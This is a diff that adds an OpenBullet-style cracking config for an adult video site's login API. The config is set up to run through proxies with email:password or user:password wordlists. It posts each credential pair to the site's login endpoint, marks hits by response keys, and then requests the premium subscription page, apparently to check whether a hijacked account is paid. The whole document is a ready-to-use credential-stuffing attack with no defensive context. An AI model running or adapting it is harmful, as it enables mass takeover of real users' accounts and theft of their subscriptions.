@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "xhamster.com",
+  "SuggestedBots": 90,
+  "LastModified": "2019-04-09T21:20:51.4151533-04:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://xhamster.com/x-api" AutoRedirect=TRUE 
+  CONTENT "[{\"name\":\"authorizedUserModelFetch\",\"requestData\":{\"$id\":\"4fe0032c-7243-417d-88f3-93803a87b9cc\",\"id\":null,\"trusted\":true,\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":0,\"redirectURL\":null}}]" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: xhamster.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://xhamster.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "DNT: 1" 
+  HEADER "Content-Type: text/plain" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://xhamster.com/" 
+  HEADER "Accept-Language: en,en-US;q=0.9,ar;q=0.8" 
+  HEADER "Cookie: stats_id={}; stats_src_last={}; ref_init={}; ref_init_url={}; prs={}; stats_uid={}; AMP_TOKEN={}; _ga={}; _gid={}; xh_exp_19={}; categories={}; ts_popunder={}; x_view_probe={}; x_content_preference_index={}; x_preroll={}; search_last_list={}; u-v-channels={}; x_viewes={}; UID={}; lang={}; ca-xhp={}; ca-xhl={}; stats_cnt={}; stats_src={}" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"extras\":{\"error\":" 
+  KEYCHAIN Success OR 
+    KEY "\"result\":" 
+REQUEST GET "https://xhamsterpremium.com/?utm_campaign=user&utm_content=index&utm_medium=button&utm_source=xhamster" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
